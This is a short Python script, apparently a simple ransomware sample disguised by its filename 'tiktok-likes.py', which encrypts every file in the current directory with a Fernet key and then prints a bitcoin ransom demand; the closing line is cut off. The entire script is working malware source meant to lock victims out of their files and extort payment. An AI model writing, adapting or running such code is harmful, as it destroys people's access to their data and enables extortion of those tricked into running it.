#!/usr/bin/env python3

import os
from cryptography.fernet import Fernet


#lets find some files

files = []

for file in os.listdir():
        if file == "tiktok-likes.py" or file == "thekey.key" or file == "decrypt.py":
                continue
        if os.path.isfile(file):
                files.append(file)

print(files)


key = Fernet.generate_key()

with open("thekey.key", "wb") as thekey:
        thekey.write(key)

for file in files:
        with open(file, "rb") as thefile:
                contents = thefile.read()
        contents_encrypted = Fernet(key).encrypt(contents)
        with open(file, "wb") as thefile:
                thefile.write(contents_encrypted)


print("all of youre files have been encrypted send me 0.0001 bitcoin on to the wallet address bitcoin:1KkefS84cptuKgQCq>